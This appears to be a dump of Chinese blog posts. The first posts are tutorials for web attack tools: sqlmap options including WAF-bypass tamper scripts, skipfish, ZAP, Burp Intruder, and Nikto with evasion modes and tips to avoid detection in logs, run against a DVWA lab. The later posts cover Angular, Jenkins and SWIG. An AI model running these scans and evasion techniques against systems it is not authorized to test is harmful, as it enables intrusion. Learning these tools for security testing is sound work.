HTTPS1sqlmap -u \"http://1.1.1.1/a.php?id=1:8843\" --force-ssl 扫描配置文件1sqlmap -c sqlmap.conf REQUEST：123456789101112131415161718192021222324252627282930313233343536373839404142434445Request: These options can be used to specify how to connect to the target URL --method=METHOD Force usage of given HTTP method (e.g. PUT) --data=DATA Data string to be sent through POST --param-del=PARA.. Character used for splitting parameter values --cookie=COOKIE HTTP Cookie header value --cookie-del=COO.. Character used for splitting cookie values --load-cookies=L.. File containing cookies in Netscape/wget format --drop-set-cookie Ignore Set-Cookie header from response --user-agent=AGENT HTTP User-Agent header value --random-agent Use randomly selected HTTP User-Agent header value --host=HOST HTTP Host header value --referer=REFERER HTTP Referer header value -H HEADER, --hea.. Extra header (e.g. \"X-Forwarded-For: 127.0.0.1\") --headers=HEADERS Extra headers (e.g. \"Accept-Language: fr\\nETag: 123\") --auth-type=AUTH.. HTTP authentication type (Basic, Digest, NTLM or PKI) --auth-cred=AUTH.. HTTP authentication credentials (name:password) --auth-file=AUTH.. HTTP authentication PEM cert/private key file --ignore-code=IG.. Ignore HTTP error code (e.g. 401) --ignore-proxy Ignore system default proxy settings --ignore-redirects Ignore redirection attempts --ignore-timeouts Ignore connection timeouts --proxy=PROXY Use a proxy to connect to the target URL --proxy-cred=PRO.. Proxy authentication credentials (name:password) --proxy-file=PRO.. Load proxy list from a file --tor Use Tor anonymity network --tor-port=TORPORT Set Tor proxy port other than default --tor-type=TORTYPE Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default)) --check-tor Check to see if Tor is used properly --delay=DELAY Delay in seconds between each HTTP request --timeout=TIMEOUT Seconds to wait before timeout connection (default 30) --retries=RETRIES Retries when the connection timeouts (default 3) --randomize=RPARAM Randomly change value for given parameter(s) --safe-url=SAFEURL URL address to visit frequently during testing --safe-post=SAFE.. POST data to send to a safe URL --safe-req=SAFER.. Load safe HTTP request from a file --safe-freq=SAFE.. Test requests between two visits to a given safe URL --skip-urlencode Skip URL encoding of payload data --csrf-token=CSR.. Parameter used to hold anti-CSRF token --csrf-url=CSRFURL URL address to visit to extract anti-CSRF token --force-ssl Force usage of SSL/HTTPS --hpp Use HTTP parameter pollution method --eval=EVALCODE Evaluate provided Python code before the request (e.g. \"import hashlib;id2=hashlib.md5(id).hexdigest()\") 数据端：–data12get/post 都适用sqlmap -u \"http://1.1.1.1/a.php\" --date=\"user=1&amp;password=1\"-f 变量分隔符： –param-del12http://1.1.1.1/a.php?q=foo;id=1sqlmap -u \"http://1.1.1.1/a.php\" --data=\"q=foo;id=1\"--param-del 设置cookie：–cookie123要先登录过网站，然后在浏览器中获得相应的cookiesqlmap -u \"http://172.16.242.128/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#\" --cookie=\"security=low; PHPSESSID=ad58bee7a7c5b3dcd7e26a24e4446e56\"检查cookie中的注入点，则要加上 --level 2（至少大于等于2） user-agent：123--random-agent：使用这个参数，就会使用/usr/share/sqlmap/txt/user-agents.txt这个字典来代替默认的user-agent检查user-agent中的注入点，则要加上--level 3（至少大于等于3） host头：12--host=\"\"检查host中的注入点，则要加上--level 5 （5为最高级别） 基于HTTP协议的身份验证1234BasicDigestNTLMsqlmap -u \"http://1.1.1.1/a.php?id=1\" --auth-type Basic --auth-cred \"user:pass\" –auth-cert / –auth-file123--auth-file=\"ca.PEM\"含有私钥的PEM 格式证书文件PEM格式的证书链文件 http(s) 代理123--proxy=\"http://127.0.0.1:8087\"（代理服务器开启后的地址）--proxy-cred=\"name:pass\" （连接代理需要的身份验证）--ignore-proxy（忽略系统级代理设置，通常用于扫描本地网络目标） 其他参数123456789101112131415--delay （每次http(s)请求之间延迟时间，浮点数，单位为秒，默认无延迟）--timeout（请求超时时间，浮点数，默认30s）--retries（http(s)连接超时重试次数，默认3次）--randomize（长度、类型与原始值保持一致的前提下，指定每次请求随机取值的参数名）例 sqlmap -u \"http://1.1.1.1/a.php?id=100\" --randomize='id'（这样的话，每次id就会在100-999随机取，因为长度、类型都与原始值保持一致）--scope（过滤日志内容，通过正则表达式筛选扫描对象）例 sqlmap -l burp.log --scope=\"(www)?\\.target\\.(com | net | org)\"例 sqlmap -l 2.log --scope=\"(19)?\\.169\\.20\\.(1 | 10 | 100)\"--safe-url / --safe-freq（检测和盲注阶段会产生大量失败请求，服务端可能会销毁session）（每发送--safe-freq次注入请求后，发送一次正常请求）--skip-urlencode（默认Get方法会对传输内容进行编码，某些web服务器不遵守RFC标准编码，使用原始字符提交数据）--eval（每次请求前执行指定的python代码，每次请求更改或增加新的参数值（时间依赖、其他参数值依赖））例 sqlmap -u \"http://1.1.1.1/a.php?id=1&amp;hash=111111111111111111\" --eval=\"import hashlib;hash=hashlib.md5(id).hexdigest()\" OPTIMIZATTION:12345678Optimization: These options can be used to optimize the performance of sqlmap -o Turn on all optimization switches --predict-output Predict common queries output --keep-alive Use persistent HTTP(s) connections --null-connection Retrieve page length without actual HTTP response body --threads=THREADS Max number of concurrent HTTP(s) requests (default 1) -o开启下面三个性能呢参数，（除–threads参数）1234--predict-output（根据检测方法，比对返回值和统计表内容，不断缩小检测范围，提高检测效率）（检测版本名，用户名，密码，Privileges，role，数据库名称，表名，列名）与--threads参数不兼容统计表:/usr/share/sqlmap/txt/common-outputs.txt 1234--keep-alive(使用http(s)长连接，性能好)与--proxy参数不兼容长连接避免重复建立连接的网络开销，但大量长连接会严重占用服务器资源 1234--null-connection之火取相应页面的大小值，而非页面具体内容通常用于盲注判断 真/假 ，降低网络带宽消耗与--text-only参数不兼容 1234--threads最大并发线程，盲注时每个线程获取一个字符（7次请求），获取完成后线程结束默认值为1,建议不要超过10,否则可能影响站点可用性与--predict-output参数不兼容 INJECTION123456789101112-p （指定扫描的参数，使--level失效）-skip（排除指定的扫描参数）--dbms=\"mysql\"（指定数据库管理系统版本）--os（指定操作系统 linux或window）--invalid-bignum / --invalid-logical （通常sqlmap使用负值使参数取值失效 id=13-&gt;id=-13）（bignum使用大数使参数值失效 id=9999999999）（logical使用布尔判断使取值失效 id=13 AND 18=19）--no-escape（处于混淆和避免出错的目的，payload中用单引号界定字符串时sqlmap使用char()编码逃逸的方法替换字符串）--tamper（混淆脚本，用于绕过应用层过滤，IPS，WAF）sqlmap -u \"http://1.1.1.1/a.php?id=1\" --tamper=\"between.py,randomcase.py\"具体目录（/usr/share/sqlmap/tamper） 暂时就介绍这么多，sqlmap还有很多参数，可以用命令sqlmap -hh查看","categories":[{"name":"安全","slug":"安全","permalink":"https://recallhyx.github.io/categories/安全/"}],"tags":[{"name":"工具","slug":"工具","permalink":"https://recallhyx.github.io/tags/工具/"}]},{"title":"安全工具介绍（二）","slug":"安全工具介绍（二）","date":"2018-01-22T12:07:15.000Z","updated":"2018-02-01T08:19:42.615Z","comments":true,"path":"2018/01/22/安全工具介绍（二）/","link":"","permalink":"https://recallhyx.github.io/2018/01/22/安全工具介绍（二）/","excerpt":"","text":"skipfishC语言编写，实验性的主动web安全评估工具，递归爬取，基于字典探测，速度较快，多路单线程，全异步网络I/O，消除内存管理和调度开销，启发式自动内容识别，误报较低用法12skipfish -o 目录 http://172.16.242.128/ ×将扫描结果存在目录skipfish -o 目录 @新建文件.txt ×扫描一个文件里面的url 1234567参数或技巧：-I （大写 i）：只检查包含‘string’的url 例：skipfish -o test1 -I /dvwa/ http://172.16.242.128/dvwa/dkpg -L skipfish | grep wl ：查看skipfish自带的字典-S ：使用字典扫描 例：skipfish -o test2 -I /dvwa/ -S /usr/share/skipfish/dictionaries/complete.wl http://172.16.252.128/dvwa/-X ：不检查包含‘string’的url 例： skipfish -o test3 -X /logout.php/ http://172.16.242.128/dvwa/-l （小写L） 每秒最大请求数 例： skipfish -o test4 -l 20 http://172.16.242.128/dvwa/-m 每ip最大并发链接数 身份认证1skipfish -o test5 -C \"sessionid=123\" -C \"secruity=low\" -I /dvwa/ http://172.16.242.128/dvwa OWASP_ZAPzed atteck proxy，web application 集成渗透测试和漏洞挖掘工具，开源免费跨平台简单易用，截断代理，主动，被动扫描，Fuzzy 暴力破解截断代理：就像vega一样，要手动去点击页面，浏览器也需要设置代理，默认代理端口为8080主动扫描：在quick start输入url，点击Attack就开始了 Fuzzy：在工具栏的tools，就可以看到fuzz选项，点击后选择一个模式的某个url进入以下窗口 zap就会自动生成请求头，然后选择某些字，点击右边的add 再选择要替换的内容，点击确定，然后start fuzz 就能在下面的标签栏看到刚才的请求 也可以使用file fuzzers 来选择，就像上面的图片一样，选择目录发现的字典来进行 fuzz扫描策略： 如图，在右上角有一个scan policy manager的图标，点击就会出现一个新窗口，可以修改默认测略，也可以新建一个测略 注意：攻击强度太高，可能会把目标服务器搞垮，尽量不要使用，在最下两个选项选择后，需要点击Go按钮确认。扫描标准流程：1、设置代理2、手动爬网3、自动爬网4、主动扫描 Burpsuite统一的集成工具发现现代web安全漏洞，所有的工具共享一个能处理并显示HTTP消息的可扩展框架，模块之间无缝交换信息，Brup free 没有主动扫描工具，profession 有主动扫描工具生成证书： 在Proxy选项卡中的Options选项卡中的Proxy Listeners可以选择导出证书，选择第一个导出之后，就可以在浏览器添加证书爬网：在pro版本上，菜单栏的Brup可以点击save state然后可以与之后的扫描做对比 intruder：用来fuzz模糊测试的功能 点击send to Intruder就能在Intruder标签看到以下内容 这是定义变量，在左边可以添加、清除变量，这个变量就是要替换的内容在payload标签选择字典12345Attack Type：Sniper：一次只指定一个字典进行攻击，也就是说，设置了两个变量，在攻击的时候一个变量会先用字典的内容替换，另外一个变量会固定Battering ram：一次只指定一个字典攻击，但是两个变量都是同时替换，替换成同个字典Pitch fork ：有多少个变量，就指定多少个字典，在攻击的时候，是每个字典的同一行进行替换，如果两个字典的行数不匹配，则在执行完短的字典后就停止攻击Cluster bomb：攻击时，先选择一个字典的第一行，然后再选择另一个字典的全部行进行攻击 在option选项卡中的Grep Match可以指定字符，当该字符出现的时候，就代表攻击成功，会在攻击的窗口出现打勾 除了把表单内容设置为变量，还可以把url的某个字作为变量。","categories":[{"name":"安全","slug":"安全","permalink":"https://recallhyx.github.io/categories/安全/"}],"tags":[{"name":"工具","slug":"工具","permalink":"https://recallhyx.github.io/tags/工具/"}]},{"title":"安全工具介绍（一）","slug":"安全工具介绍（一）","date":"2018-01-19T15:34:31.000Z","updated":"2018-02-01T08:20:40.391Z","comments":true,"path":"2018/01/19/安全工具介绍（一）/","link":"","permalink":"https://recallhyx.github.io/2018/01/19/安全工具介绍（一）/","excerpt":"","text":"HTTrack主要是用来爬取网站对应的文件，包括html和js等其他资源文件，当爬取下来本地之后，就能再本地看这个网站用的所有文件中，有没有一些文件是配置文件可以攻击 Nikto最大的特点就是能够解决404误判，在当时有一些无效的页面也会返回200，这个时候如果只根据返回码200来攻击，那就会浪费资源。 就会在发起请求之前，先发起几千次各种无效后缀的文件请求，获得对应的相应内容，然后才会发送真正的请求，主要用于扫描服务端的漏洞12345678常用指令nikto update *更新nikto ，要翻墙nikto -list-plugins *列出所有的插件nikto -host http://172.16.242.128/dvwa *扫描方式一，域名nikto -host 172.16.242.128 -port 80,443 *扫描方式二，ip地址加端口，http默认443，在后面加参数 -sslnikto -host host.txt *扫描方式三，扫描一串ip地址的文件nikto -host https://www.baidu.com -useproxy http://localhost:8087 *扫描方式四，代理扫描nikto -host https://172.16.242.128/dvwa -evasion 12345678 *扫描方式五，逃避扫描，即用一些技术逃避服务端的一些监测， 后面的数字12345678 代表使用的技术的编号，具体可以用 man nikto 查看 打开配置文件命令vi /etc/nikto.conf 用 nikto 记得改默认配置，把useragent改成其他浏览器的useragent，免得被人查看日志就发现有人用nikto扫描。要使用cookie，就要找到配置文件里面的 static-cookie 自己设置 vega图形化界面，java编写的，代理模式，扫描模式，爬站，处理表单，注入测试，支持ssl，注意，Kali linux 2.0 没有内置 vega apt-get install vega 手动下载一定要配置代理，如下，ip:127.0.0.1,port:8888 然后在浏览器里面设置代理，我用的是火狐的 AutoProxy 这样浏览器的流量就会通过代理，但是需要手动点击页面，提交表单或者其他 手动点完页面之后就会产生以上，看左侧的Website View，灰色的意思就是页面会链接到其他页面，但是我们没有手动点到，然后，就把模式，从proxy转到scanner模式，让vega自己去爬取网站。下面的Scan Alerts就是手动点击页面之后的一些漏洞报告，点击可查看详情 然后点击左上角第三个图标手动添加一个scope 最下面的Exclude就是排除扫描的url，因为有一些链接会注销当前用户，这样页面就不能一直爬下去了。然后点击左上角第一个图标开始vega扫描，选择刚创建的scope，就可以开始扫描。如果网站需要cookie，除了可以在刚才的开始扫描图标的向导里面设置，还可以在主界面右下角identities的右边小黑人创建一个identities，基于表单的登录就要选择macro模式 然后选择登录的链接，就可以添加 然后再点击刚添加的链接，才能生成链接的参数 接下来就能在左上角第一个图标继续进行扫描了。 截断能够截断发送给服务器的请求，也能截断服务器的响应。在第二个标签，右上角添加截断规则，就能对请求截断 不过这个工具的截断不如 Burpsuite，以后会讲到Burpsuite这个工具的","categories":[{"name":"安全","slug":"安全","permalink":"https://recallhyx.github.io/categories/安全/"}],"tags":[{"name":"工具","slug":"工具","permalink":"https://recallhyx.github.io/tags/工具/"}]},{"title":"Angular Material2 常用组件用法","slug":"AngularMaterial2常用组件用法","date":"2018-01-13T02:42:31.000Z","updated":"2018-01-27T07:03:01.168Z","comments":true,"path":"2018/01/13/AngularMaterial2常用组件用法/","link":"","permalink":"https://recallhyx.github.io/2018/01/13/AngularMaterial2常用组件用法/","excerpt":"","text":"（时隔2个多月终于有时间来写博文了）先总结一下，11月接到一个项目，做到12月然后停工准备考试，到1月才重新开始工作，把一些收尾工作做了，这个项目也是第一次用 Angular Material2 组件，其中还是有一些坑的，就记录一下这是Angular Material官网 一、安装Angular Material首先根据官网的指导Get Start安装Material坑1： 安装完的 Angular Material，有时候不能 AOT预编译，这个时候要看依赖包文件，我是用 webpack 这个框架，所以看package.json就可以看到所有依赖包 依赖包 可以看到，除了&quot;@angular/material&quot;: &quot;^5.0.0-rc0&quot;为5.0.0之外，还有其他包也要升级，至少要升级到5.0.0坑2：即使你已经升级到最新版，还有可能不能AOT编译，当初这个问题搞了我好久，（也不久，就一个晚上），然后就有种直觉是框架的问题，第二天果断换框架，其实也就是升级框架，之前用的是 webpack6，看了github发现 webpack 已经有7了，果断换成webpack7，然后就能 AOT预编译了总结：一开始遇到问题是很正常的，这还是第一步，所以第一步不好好解决的话，后面的工作会很难开展的，幸好是项目一开始就发现不能AOT预编译的问题，不然到后期大改就很麻烦了 二、使用Angular Material关于怎么使用 Angular Material 官网并没有说明怎么用，一开始我以为引入组件就能用的，其实并不是，看了官网的例子也没有说，之后通过官网在线编辑，才发现玄机123456789101112131415161718192021222324252627282930313233import &#123; MatAutocompleteModule, MatButtonModule, MatButtonToggleModule, MatCardModule, MatCheckboxModule, MatChipsModule, MatDatepickerModule, MatDialogModule, MatExpansionModule, MatGridListModule, MatIconModule, MatInputModule, MatListModule, MatMenuModule, MatNativeDateModule, MatPaginatorModule, MatProgressBarModule, MatProgressSpinnerModule, MatRadioModule, MatRippleModule, MatSelectModule, MatSidenavModule, MatSliderModule, MatSlideToggleModule, MatSnackBarModule, MatSortModule, MatTableModule, MatTabsModule, MatToolbarModule, MatTooltipModule, MatStepperModule,&#125; from '@angular/material'; 123456789101112131415161718192021222324252627282930313233343536373839import &#123;CdkTableModule&#125; from '@angular/cdk/table';@NgModule(&#123; exports: [ CdkTableModule, MatAutocompleteModule, MatButtonModule, MatButtonToggleModule, MatCardModule, MatCheckboxModule, MatChipsModule, MatStepperModule, MatDatepickerModule, MatDialogModule, MatExpansionModule, MatGridListModule, MatIconModule, MatInputModule, MatListModule, MatMenuModule, MatNativeDateModule, MatPaginatorModule, MatProgressBarModule, MatProgressSpinnerModule, MatRadioModule, MatRippleModule, MatSelectModule, MatSidenavModule, MatSliderModule, MatSlideToggleModule, MatSnackBarModule, MatSortModule, MatTableModule, MatTabsModule, MatToolbarModule, MatTooltipModule, ]&#125;)export class DemoMaterialModule &#123;&#125; 在官网的在线编辑的main.ts（或者app.module.ts）里面，是有以上两段代码的，这就是把所有的material组件作为一个module，然后再把这个module放到整个项目内唯一一个AppModule里面，就像官网做的那样 这样就能成功引用组件了 三、常用组件用法1、buttonbutton是最基础的组件，最常用的就是提交表单的时候，这里用一个验证码的例子来说明button怎么用 这里点击获取验证码后就disable使按钮不可点击，然后再根据后端返回值，来进行倒数 倒计时代码如下：1234567891011121314151617//倒计时countdown = 30;setTime(obj)&#123; if(this.countdown==0)&#123; this.disablebtn = false; this.tipstring = \"获取验证码\"; this.countdown = 30; return; &#125;else&#123; this.disablebtn = true; this.tipstring = \"（\"+this.countdown+\"s）\"; this.countdown--; &#125; setTimeout(()=&gt;&#123; this.setTime(obj); &#125;,1000)&#125; 这样，要一个变量控制是否disable按钮，然后根据业务逻辑自己调整即可2、tabs tabs 这里主要讲 tabs的事件怎么用12345&lt;!-- html --&gt;&lt;mat-tab-group (selectedTabChange)=\"select($event)\"&gt; &lt;mat-tab label=\"Tab 1\"&gt;Content 1&lt;/mat-tab&gt; &lt;mat-tab label=\"Tab 2\"&gt;Content 2&lt;/mat-tab&gt;&lt;/mat-tab-group&gt; 123456789101112//tsselect = (tabChangeEvent: MatTabChangeEvent): void =&gt; &#123; console.log(tabChangeEvent.index); switch (tabChangeEvent.index) &#123; case 0: &#123; ... &#125; break; case 1: &#123; ... &#125; break; &#125; &#125;; 上面的 tabChangeEvent.index就是你现在选中的tab，根据不同的tab可以做不同的事情3、snackbar snackbar snackbar 就相当于 Android 的 toast，为了提醒用户一些信息的snackbar 不难，重点在于它可以复用 ，它有一个属性data可以用来传值 传值 之后只需要在snackbar组件中就可以用 data属性了4、dialog对话框是一个很重要的交互方式，它可以用于提醒用户信息，也可以用来进行一些输入，这里给出一个复用的例子，用于通知用户一些信息123456789&lt;!-- html --&gt;&lt;h1 mat-dialog-title&gt;&#123;&#123;data.title&#125;&#125;&lt;/h1&gt;&lt;div mat-dialog-content&gt; &lt;p&gt;&#123;&#123;data.content&#125;&#125;&lt;/p&gt;&lt;/div&gt;&lt;div mat-dialog-actions align=\"center\"&gt; &lt;button *ngIf=\"data.isOkButton\" mat-button (click)=\"data.OkEvent()\" tabindex=\"2\"&gt;&#123;&#123;data.OkButtonContent&#125;&#125;&lt;/button&gt; &lt;button *ngIf=\"data.isNoButton\" mat-button (click)=\"data.NoEvent()\" tabindex=\"1\"&gt;&#123;&#123;data.NoButtonContent&#125;&#125;&lt;/button&gt;&lt;/div&gt; 1234567891011121314151617export class CustomDialogNoticeComponent&#123; constructor( public dialogRef: MatDialogRef&lt;CustomDialogNoticeComponent&gt;, @Inject(MAT_DIALOG_DATA) public data: any) &#123; &#125;&#125;export interface CustomDialogData&#123; title:string; content:string; isOkButton:boolean; isNoButton:boolean; OkEvent?:Function; NoEvent?:Function; OkButtonContent?:string; NoButtonContent?:string;&#125; 这样，就可以在打开这个对话框的时候，传一个 CustomDialogData的对象，就能根据这些信息配置对话框5、datepicker这里主要讲怎么换成中文，因为默认是按照老美那边的标识的，所以要用在我们这边，就需要做一些改动首先，安装 momentjs momentjs: JavaScript 日期处理类库 npm install moment --save然后按照官网的例子123456789101112131415@Component(&#123; ... providers: [ // The locale would typically be provided on the root module of your application. We do it at // the component level here, due to limitations of our example generation script. &#123; provide: MAT_DATE_LOCALE, useValue: 'zh-cn' &#125;, // `MomentDateAdapter` and `MAT_MOMENT_DATE_FORMATS` can be automatically provided by importing // `MatMomentDateModule` in your applications root module. We provide it at the component level // here, due to limitations of our example generation script. &#123; provide: DateAdapter, useClass: MomentDateAdapter, deps: [MAT_DATE_LOCALE] &#125;, &#123; provide: MAT_DATE_FORMATS, useValue: MAT_MOMENT_DATE_FORMATS &#125;, ],&#125;) ... 将{ provide: MAT_DATE_LOCALE, useValue: &#39;zh-cn&#39; },的useValue改成&#39;zh-cn就是中文了，具体时区代号参考 ##四、总结总的来说 Angular Material 组件集成了很多东西，也方便了我们的使用，适合敏捷开发，但是会带来一些依赖性的问题，比如你要为了使用 Angular Material 而改变接口的格式或者和后端的一些对接问题。但是 Angular Material 可以更加复用，我只是很低程度的复用而已","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"angular2","slug":"angular2","permalink":"https://recallhyx.github.io/tags/angular2/"}]},{"title":"配置Jenkins","slug":"配置Jenkins","date":"2017-10-19T13:01:57.000Z","updated":"2018-04-06T08:01:45.848Z","comments":true,"path":"2017/10/19/配置Jenkins/","link":"","permalink":"https://recallhyx.github.io/2017/10/19/配置Jenkins/","excerpt":"","text":"哈哈哈，终于搞定持续集成的配置了，买来的阿里云服务器也能发挥一点作用了，来记录一下怎么在阿里云服务器上配置持续集成 首先，什么是持续集成简单来说，就是代码提交到 Git 或者 SVN 上的时候，会帮你build项目，然后跑测试，如果在build项目或者跑测试的时候出现错误，构建就会失败，然后能够通知你哪里出错了，如果没有错误，就会帮你发布项目（这么一看是不是很爽，每次提交代码就能自动构建）我们使用的持续集成工具就是 Jenkins 下载Jenkins 我们下载的是 .war后缀的，下载下来是一个包，需要装 Java 才能进行操作，怎么在服务器上装 Java 就不详细描述了 启动Jenkins下载好 Jenkins ，安装且配置好 Java 后，我们只需要输入这条语句java -jar jenkins.war 就能启动Jenkins第一次启动 Jenkins会给一个秘钥 如果忘记了秘钥，就可以到.jenkins/secrets/initialAdminPassword这个文件找注意：这个文件是隐藏的，要在命令行用ls -a这个命令来显示启动后，就可以在浏览器输入网址来看，默认是8080端口http://localhost:8080 注意：如果是把jenkins放在tomcat上，那么进入jenkins的网址就是 http://localhost:8080/jenkins 把上一步得到的秘钥输进去就能进到jenkins的页面了 安装推荐的插件就够用了， 之后也能自己下载 这就是界面了 Github配置由于我们使用Github来做代码管理的，所以我们在自己的服务器上安装Git后生成ssh，添加到我们Github仓库 新建项目 新建一个自由风格的项目 点击保存，退出到主界面，点击立即构建 就构建好了在/root/.jenkins/workspace可以看到我们的项目以后每次提交代码都会触发构建，至于发布都要写在配置里面的Excute Shell里面，也可以写成一个脚本文件，到时候执行这个脚本 总的来说是挺多坑坑坑坑坑坑坑的，国庆配这个jenkins配得怀疑人生，有很多坑其实是脚本的坑，要自己多尝试","categories":[{"name":"运维","slug":"运维","permalink":"https://recallhyx.github.io/categories/运维/"}],"tags":[{"name":"Jenkins","slug":"Jenkins","permalink":"https://recallhyx.github.io/tags/Jenkins/"}]},{"title":"Python调用C++的方式","slug":"Python调用C的方式","date":"2017-09-22T13:47:18.000Z","updated":"2018-01-27T07:03:15.481Z","comments":true,"path":"2017/09/22/Python调用C的方式/","link":"","permalink":"https://recallhyx.github.io/2017/09/22/Python调用C的方式/","excerpt":"","text":"（国庆前夕来完成每月一篇博文的任务）这次来讲讲怎么将 c++和 python 结合在一起，主要是由 python 来调用 c++的函数首先，我们需要一个东西 swig （这网站看起来很旧，但其实swig是有在更新的） 点击下载最新版就行了 什么是SWIG ? SWIG是一个能将C或者C++编写的程序与其它各种高级语言如Perl, Python, Ruby, 和 Tcl进行联接的开发工具。其原理是从C/C++头文件中找到申明并利用他们生成脚本语言访问C/C++代码所必须的封装代码。SWIG具有高度可自定义的特点，它能帮助你生成适合你的应用程序的封装包。 所以，我们借助 SWIG 把 c++代码编译成 python 能够引用的模块，就能在python里调用c++了 下载解压完成之后我们还要配环境变量 这样第一步就行了第二步，我们要先写 c++ 的函数我们需要三个文件hello.h------------头文件hello.cpp---------源文件hello.i-------------配置文件 我们在hello.h声明一个函数 Hello(char *str)这里不能用string，python调用有问题，具体不清楚，参数为char \\则可以调用* 然后在 hello.cpp实现这个函数 最后配置文件hello.i #define SWIG_FILE_WITH_INIT这句规定了要被编译成 python的模块#include &quot;hello.h&quot;给出需要包含的头文件void Hello(char * str);在 hello.i这个文件的最后给出想要编译的函数第三步，使用命令编译打包在命令行输入swig -python -c++ hello.i编译，成功之后就会生成hello_wrap.cxx这个文件第四步，我们还需要写一个名为setup.py的python文件 在第三步打包的模块还缺少动态链接库，所以我们需要这个 setup.py来生成python使用的动态链接库在命令行中输入python setup.py build_ext --inplace成功后会生成_hello.cp35-win_amd64.pyd这个文件第五步，把生成的两个文件都放到要用的python目录下，就可以在python里面调用了 大功告成 !成功的调用了c++的函数，大家可以自行发挥了","categories":[{"name":"后端","slug":"后端","permalink":"https://recallhyx.github.io/categories/后端/"}],"tags":[{"name":"python","slug":"python","permalink":"https://recallhyx.github.io/tags/python/"}]},{"title":"Angular2移除console","slug":"Angular2移除console","date":"2017-09-04T11:19:16.000Z","updated":"2018-01-27T07:02:24.929Z","comments":true,"path":"2017/09/04/Angular2移除console/","link":"","permalink":"https://recallhyx.github.io/2017/09/04/Angular2移除console/","excerpt":"","text":"(拖更一个月啦，又来记录一些在项目开发中用到的东西)这是只是一个小技巧而已 我们在Angular开发过程中，都会用console.log()这个函数来输出一些东西在开发完成后，我们想去掉 console.log() ，当然可以一个个找到并删除，但是这样太费时费力了，我也试过在配置文件 tslint.json里面加入 &quot;no-console&quot;:{true,&quot;log&quot;}这条规则来直接去除，但是也没什么卵用，后来找到一种方法，下面为介绍这种方法首先，我们先找到 environment.ts 这个文件 ，我的是在 src-&gt;app目录下 让我们点开来看看： 其实environment.ts这个文件是用来根据当前是处于开发环境还是发布环境来进行一些设置的，我们看到if(&#39;production&#39; === ENV) 就是说，当当前的 环境 是 production 也就是发布环境的时候，进行一些操作，对应的else就是说在开发环境，所以我们要在 发布环境做一些东西 其实只要这一句window.console.log=function () {}这句话的意思就是 替换 console.log()这个函数为空，为空就不会进行任何操作了嘛这样的好处是：1、原代码不用进行任何改动2、在开发环境中console.log()这个函数还是能正常工作","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"angular2","slug":"angular2","permalink":"https://recallhyx.github.io/tags/angular2/"}]},{"title":"Angular2动态加载组件","slug":"Angular2动态加载组件","date":"2017-07-01T03:21:23.000Z","updated":"2018-01-27T07:02:15.124Z","comments":true,"path":"2017/07/01/Angular2动态加载组件/","link":"","permalink":"https://recallhyx.github.io/2017/07/01/Angular2动态加载组件/","excerpt":"","text":"（日常水一下，由于6月要复习应付考试啥的，没时间写博客，本来想写一篇关于自动化测试的博文，最近又在学 Angular2，解决了一个技术问题，就先写这篇文章） 好的，进入正文，关于Angular2动态加载组件，之前在网上搜到的是用 DynamicComponentLoader()这个函数，但是这个函数在 Angular2就弃用了，于是再搜了一下，找到了这个函数ComponentFactoryResolver()接下来就来看一下怎么使用这篇博文借鉴了-&gt;这篇文章，上面他的实例的完整代码，但是我有自己的demo。第一步创建一个名为dynamic-component.directive.ts的文件123456789import &#123;Directive,ViewContainerRef&#125; from '@angular/core';@Directive(&#123; selector: '[appDynamicComponent]'&#125;)export class DynamicComponentDirective&#123; constructor(public viewContainerRef:ViewContainerRef)&#123;&#125;&#125; 代码在上面，首先，这个文件用了@Directive这个装饰器，简单来说就是找到html中带有 selector中属性的那个标签，在这里就是找到 标签中带有 appDybanucComponent这个属性的标签。然后我们export 一个类，这个类注入了ViewContainerRef，它可以让我们得知目前所在的HTML元素中包含的View內容，也可以通过它來改变View的结果(ex: 动态的产生Component、移除某个Component等等)。也就是说，这个文件做了两件事情，第一件事情就是找到要改变的标签，第二件事情就是对它进行改变。这里我们还导出了 DynamicComponentDirective 这个类，下面会用到第二步既然我们是对带有 appDynamicComponent的标签进行操作，那么我们的html里面某个标签有这个属性，在 app.component.html中写以下代码1234567891011121314151617181920&lt;div id=\"wrapper\"&gt; &lt;div id=\"body\" class=\"clearfix\"&gt; &lt;div id=\"left\"&gt; &lt;div class=\"inner\"&gt; left &lt;!--看这里--------------------------------------------------------------------------&gt; &lt;ng-template appDynamicComponent&gt;&lt;/ng-template&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=\"right\"&gt; &lt;div class=\"inner\"&gt; &lt;button class=\"button\" (click)=\"CreateGroup()\"&gt;添加组&lt;/button&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 上面的标签里面就有appDynamicComponent属性，于是就找到了对应的标签。我们还写了一个button，点击之后就会进入CreateGroup()这个函数，这个函数就是我们要加载组件的函数第三步我们找到了这个标签，接下来就要动态的加载组件了，那么我们应该就要有另外一个组件，创建一个名为text.component.ts的文件12345678import &#123;Component&#125; from '@angular/core'@Component(&#123; selector: 'text', template:'&lt;label&gt;text&lt;/label&gt;'&#125;)export class TextComponent&#123;&#125; 这个文件就只有一行文本 